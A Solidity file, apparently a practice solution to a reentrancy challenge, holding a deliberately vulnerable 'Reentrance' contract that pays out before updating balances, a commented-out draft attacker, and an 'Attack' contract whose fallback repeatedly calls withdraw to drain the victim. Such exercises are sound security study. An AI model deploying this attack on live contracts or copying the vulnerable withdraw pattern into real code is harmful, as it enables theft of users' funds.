// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// contract Reentrance {
  
//   using SafeMath for uint256;
//   mapping(address => uint) public balances;

//   function donate(address _to) public payable {
//     balances[_to] = balances[_to].add(msg.value);
//   }

//   function balanceOf(address _who) public view returns (uint balance) {
//     return balances[_who];
//   }

//   function withdraw(uint _amount) public {
//     if(balances[msg.sender] >= _amount) {
//       (bool result,) = msg.sender.call{value:_amount}("");
//       if(result) {
//         _amount;
//       }
//       balances[msg.sender] -= _amount;
//     }
//   }

//   receive() external payable {}
// }


// contract B{

//   Reentrance public r;

//   constructor(Reentrance _r){
//  r = _r; 
//   }


//   function donate() public payable{

//       //r.donate(address(this));
//      // address(r).call{value:1000000000000000000}("0x8ba14562");
//      (bool success, bytes memory data) =  address(r).call{value:msg.value}(abi.encodeWithSignature("donate(address)",address(this)));
//      if(success){
//     this;
// }
// else{
//     revert();
// }
//      // address(r).donate.value(1000000000000000000)(addre)
//   }

//  //someAddress.call{gas: x, value: y}(data)

//   function withdraw(uint a) public payable {
   
//   (bool success, bytes memory data)= address(r).call(abi.encodeWithSignature("withdraw(uint256)",msg.value));
// if(success){
//     this;
// }
// else{
//     revert();
// }
  
      
//   }
    

//   function getSlector() public pure returns(bytes memory){
//       return abi.encodeWithSignature("withdraw(uint)");
//   }

//     function withdraw2() public {

//            r.withdraw(10000000000000000);
//     }
 
      
  

//    function getBalCheck() public view returns(uint256){
//     return address(this).balance;
//   }

//   //receive() external payable {}

//      fallback() external payable {
// //         console.log("--",1);
// //       (bool success, bytes memory data)= address(r).call(abi.encodeWithSignature("withdraw(uint256)",1000000000000000000));
// // if(success){
// //     this;
// //     console.log("--",2);
// // }
// // else{
// //   console.log("--",3);
// //     revert();

//  r.withdraw(10000000000000000);
//  }

//  //r.withdraw(address(r).balance);
        
//    // }
// //receive() external payable {}

//     // This function is called for plain Ether transfers, i.e.
//     // for every call with empty calldata.
//   //   receive() external payable {  
//   //   address(r).call(abi.encodeWithSignature("withdraw(uint256)",1000000000000000000));
//   // }



//     function donateAndWithdraw() public payable {
//       //  require(msg.value >= targetValue);
//         //r.donate.value(msg.value)(address(this));
//            (bool success, bytes memory data) =  address(r).call{value:msg.value}(abi.encodeWithSignature("donate(address)",address(this)));
//      if(success){
//     this;
// }
// else{
//     revert();
// }
//         (bool success2, bytes memory data2)= address(r).call(abi.encodeWithSignature("withdraw(uint256)",1000000000000000000));
//     }


//     //     receive() external payable {
//     //     uint targetBalance = address(r).balance;
//     //     if (targetBalance >= 1000000000000000000) {
//     //      (bool success, bytes memory data)= address(r).call(abi.encodeWithSignature("withdraw(uint256)",1000000000000000000));
//     //     }
//     // }
// }


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract Attack {

    Reentrance public victim;

    constructor(Reentrance _add) {
        victim = _add;
    }

    function checkvictimBalance() public view returns (uint) {
       return address(victim).balance;
    } 

    fallback() external payable {
        victim.withdraw(1000000000000000);
    }

    function exploit(uint amnt) public {
        victim.withdraw(1000000000000000);
    }

}




